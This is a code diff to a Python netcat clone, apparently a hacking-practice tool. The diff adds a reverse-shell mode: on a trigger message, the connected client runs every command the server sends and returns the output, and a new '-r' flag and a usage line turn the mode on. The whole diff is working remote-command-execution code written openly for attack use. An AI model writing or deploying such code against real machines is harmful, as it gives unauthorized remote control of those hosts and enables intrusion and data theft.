@@ -36,6 +36,21 @@ class CustomNetCat:
         else:
             self.send()
 
+    def client_reverse_shell_loop(self):
+        while True:
+            try:
+                request = self.receive_msg(self._sock)
+                if request.strip() == "exit":
+                    self._sock.close()
+                    sys.exit()
+                response = execute_command(request)
+                self.send_msg(self._sock, response)
+            except:
+                error = traceback.format_exc()
+                print(error)
+                self.send_msg(f'CLIENT ERROR:-\n{error}\n')
+
+
     def send(self):
         self._sock.connect((self.args.target, self.args.port))
         if self.buffer:
@@ -47,6 +62,8 @@ class CustomNetCat:
                     response = self.receive_msg(self._sock)
                     if response:
                         print(response)
+                        if response == 'initiate_reverse_shell':
+                            self.client_reverse_shell_loop()
                         msg = input('> ')
                         self.send_msg(self._sock, msg)
                 except EOFError:
@@ -86,6 +103,20 @@ class CustomNetCat:
             self._sock.close()
             sys.exit()
 
+    def _server_reverse_shell_loop(self, sock):
+        self.send_msg(sock, 'initiate_reverse_shell')
+        while True:
+            try:
+                cmd = input('shell > ')
+                self.send_msg(sock, cmd)
+                request = self.receive_msg(sock)
+                print(request)
+            except:
+                error = traceback.format_exc()
+                print(error)
+                break
+        sock.close()
+
     def _interaction_mode(self, sock):
         response = self.receive_msg(sock)
         print(response)
@@ -103,6 +134,11 @@ class CustomNetCat:
 
         elif self.args.command:
             self._spawn_shell(client_sock)
+
+        elif self.args.reverseshell:
+            self._server_reverse_shell_loop(client_sock)
+            self._sock.close()
+            sys.exit()
 
         try:
             self.send_msg(client_sock, 'Connected.')
@@ -155,6 +191,7 @@ def main():
     netcat.py -t 10.1.1.1 -p 4321 -l -c # command shell
     netcat.py -t 10.1.1.1 -p 4321 -l -u=payload.py # upload file
     netcat.py -t 10.1.1.1 -p 4321 -l -e=\"python payload.py\" # execute command
+    netcat.py -t 10.1.1.1 -p 4321 -l -r # Wait for client connection and spawn reverse shell at client side
     echo \"Hello World\" | netcat.py -t 10.1.1.1 -p 4321 -s # Echo text to server port 4321 through stdin
     netcat.py -t 10.1.1.1 -p 4321 # Connect to server
     '''
@@ -171,6 +208,7 @@ def main():
     parser.add_argument('-p', '--port', type=int, default=4321, help="Port to listen on")
     parser.add_argument('-t', '--target', default="127.0.0.1", help="Target IP")
     parser.add_argument('-u', '--upload', help="upload file")
+    parser.add_argument('-r', '--reverseshell', action='store_true', help="Spawn reverse shell at client side")
     parser.add_argument('-s', '--stdin', action='store_true', help="Specified when input is taken from stdin")
 
     args = parser.parse_args()
